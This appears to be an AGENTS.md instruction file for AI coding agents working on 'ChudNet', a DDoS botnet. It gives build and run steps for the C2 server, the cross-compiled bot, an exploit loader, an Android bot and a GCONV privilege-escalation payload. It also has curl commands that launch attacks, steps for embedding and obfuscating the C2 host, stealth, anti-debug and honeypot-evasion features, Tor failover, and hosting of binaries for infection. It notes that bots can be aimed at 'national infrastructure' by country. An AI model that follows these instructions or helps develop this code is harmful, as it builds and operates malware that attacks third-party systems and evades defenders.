# ChudNet — AGENTS.md

**Architecture**: DDoS botnet C2 system. CNC (Go), bot (C, 12-arch cross-compile), loader (Go), APK (Kotlin), GCONV backdoor payload. Admin via web REST API + Chinese-language web panel.

## Project structure

| Path | Role |
|---|---|
| `cnc/` | CNC server — bot TCP listener (7777), REST API + web panel (9999), `webpanel.go` HTML frontend |
| `bot/` | C malware client — `main.c` entrypoint, `attack/` methods, `core/` crypto/table/rand/util |
| `loader/` | Go exploit loader — reads targets from stdin, deploys exploit payloads |
| `apk/` | Android APK bot (Kotlin, Gradle) |
| `chud/` | GCONV-based privilege escalation payload (`chud.so` + `gconv-modules`) |
| `scripts/` | C2 host encoder, onion encoder, string table obfuscation |
| `testing/` | Docker Compose + native test runner |
| `config/` | Runtime config: `config.json`, `theme.json`, `honeypot.json`, `blacklist.json`, `ui/` templates, `database/` JSON store |

## Build

Full rebuild: `bash build.sh` — output goes to `~/release/`.

Full setup (first time): `sudo bash setup.sh` — installs deps, cross-compilers, SQLite DB, builds everything, configures serving infra.

### Component builds

| Component | Command |
|---|---|
| CNC | `go build -o c2_server ./cnc` |
| Bot (all archs) | built via `build.sh` using musl.cc cross-compilers at `/etc/xcompile/musl/` |
| Bot (host only) | `gcc -std=c99 -Os -fomit-frame-pointer -fno-stack-protector -static -Ibot/core/headers -Ibot/attack/headers -Ibot/system/headers $(find bot -name '*.c' \| sort) -o chud.host -lpthread` |
| Loader | `cd loader && go build -o loader .` |
| APK | `cd apk && ./gradlew assembleRelease` (requires `ANDROID_HOME`) |

### Required pre-build steps

1. **Encode CNC host** before compiling bot: `python3 scripts/encode_c2.py <HOST> > bot/core/c2host.c`
2. **Regenerate obfuscation table**: `python3 scripts/encode_all.py` (generates `bot/core/table.c`)
3. **Onion backup** (optional): `python3 scripts/encode_onion.py <ONION_ADDR> bot/core/onion.c`
4. **String obfuscation** (optional): `python3 scripts/obfstr.py $(find bot -name '*.c' -not -path '*/obf/*' | sort | tr '\n' ' ')` — replaces string literals with XOR-encrypted `_S()` macros (Armada technique), output to `bot/obf/`

## Running

### CNC server
```
ulimit -n 999999
./c2_server
```
CNC expects `config/` directory next to the binary (or in CWD). Persistence is JSON files under `config/database/` (users, history, whitelist, logs).

### API (web control panel)
```
curl "http://localhost:9999/api/attack?user=<user>&apikey=<key>&host=<target>&port=<port>&time=<sec>&method=<method>&option=<key=val>&source=<country>"
curl http://localhost:9999/api/status
curl -X POST http://localhost:9999/api/login -d '{"username":"root","password":"root"}'
```
API auth via `user` + `apikey` query params. Rate-limited (30/min default), cooldown-gated, IP whitelist + blocked hosts from `config.json`. Option string supports `key=val&key2=val2` for extra attack flags. `source` param filters bots by country code. Web panel HTML UI available at `http://localhost:9999/` with Chinese-language interface, login page, attack form, bot distribution view, and attack history.

### Bot country filtering
Prefixed commands in SSH panel: `@<country_code> <attack>` filters bots by source country. E.g. `@US udp 1.1.1.1 10` sends only US bots. Internally matches `bot.source` field.

### Native test
```
bash testing/native.sh start   # builds & runs CNC + bot locally
bash testing/native.sh stop
bash testing/native.sh status
```

### Docker test lab (preferred for dev)
```
bash testing/run.sh up         # builds & starts 5 bots + CNC on 172.99.0.0/24
bash testing/run.sh down       # destroys lab
bash testing/run.sh reset      # nuke & rebuild
bash testing/run.sh logs       # tail container logs
bash testing/run.sh attack udp 1.1.1.1 10 dport=80   # test attack via SSH panel
bash testing/run.sh shell      # bash into bot container
bash testing/run.sh cncshell   # bash into CNC container
```

### Test database setup
```
sqlite3 chudnet.db < cnc/test_cnc.sh  # creates root/root admin user (SQLite)
```
The JSON-based database auto-creates a `root/root` user if empty.

## Architecture notes

- **Bot connects** to CNC via raw TCP. Handshake: 4-byte header (`0x00 0x00 0x00 <version>`), optional source identifier, 4-byte session seed, optional 32-byte salt, then XOR crypto.
- **Crypto**: 3-round SPN obfuscation for C2 host embedding (`scripts/encode_c2.py`). C2 key split across 4 XOR-paired arrays (Armada technique). Session XOR cipher seeded by random exchange.
- **Bot stealth**: `PR_SET_NAME` to kernel thread names, `/proc/self/cmdline` wipe, unshare mount namespace, OOM protection, anti-debug via `ptrace(TRACEME)`, self-deletion from temp paths.
- **Anti-analysis**: Honeypot detection (CNC drops connections from known sandbox/VPS IP ranges loaded from `config/honeypot.json`). Anti-GDB entry logic swaps DNS resolution function.
- **Bot killer**: kills competing malware by port scanning common C2 ports.
- **Failover**: after 3 connection failures, bot switches to Tor C2 (`.onion` address from `bot/core/onion.c`).
- **Serving infra**: binaries served via HTTP (Apache on port 80), TFTP (port 69), FTP (port 21) — synced by `build.sh` to `/var/www/html/bins/`, `/var/lib/tftpboot/`, `/var/ftp/`.
- **GCONV backdoor** (`chud/`): `GCONV_PATH=./chud/` triggers `chud.so` loading via `gconv-modules` when a setuid binary calls `iconv_open()`. Privilege escalation vector.
- **Web control panel**: REST API at `/api/attack` and `/api/status`. Accepts `user`, `apikey`, `host`, `port`, `time`, `method`, `option` params. Rate-limited, cooldown-gated, IP whitelist + blocked hosts. Option string supports `key=val&key2=val2` for extra attack flags. HTML UI at `/` with Chinese-language login, attack form, bot distribution, and history views. SSE endpoint at `/api/events` for real-time updates (no polling).
- **Country categorization**: Bots tagged by `source` field on connect. SSH panel uses `@<country>` prefix to target specific countries. API `QueueBuf` third arg filters by `botCata == v.source`. Useful for filtering national infrastructure.
- **Database**: Migrated from SQLite to JSON file persistence. Tables: `users.json`, `history.json`, `whitelist.json` under `config/database/`. `setup.sh` still creates SQLite (`chudnet.db`) but runtime uses JSON.
- **UI templates**: SSH panel renders ANSI screens from `config/ui/*.tfx`. Mapped by `ui.json`. Variables `{username}`, `{max_bots}`, `{max_time}` etc. substituted at render time. Chinese-language web panel runs via REST API.

## Key conventions

- Bot C code: C99, static linking, musl libc. Annotated `__attribute__((constructor))` for anti-debug.
- String obfuscation: runtime-decoded table (`table.c` generated by `scripts/encode_all.py`). XOR + rolling key.
- CNC config: JSON in `config/config.json`. Ports, API settings, rate limits, blacklist.
- Database: JSON files in `config/database/`. Users have `api_key` field for REST auth, `proxy_allowed` for SOCKS5 access. Admin commands: `adduser`, `removeuser`, `bots`, `grantproxy`, `revokeproxy`, `proxylist`.
- All cross-compilers from `musl.cc`. Target archs: arm, arm5/6/7, x86, x86_64, mips, mipsel, ppc, sh4, m68k, arc.
- Bot count prefix `-N` in SSH panel limits attack to N bots globally. `bots=N` inside command string limits per-command.
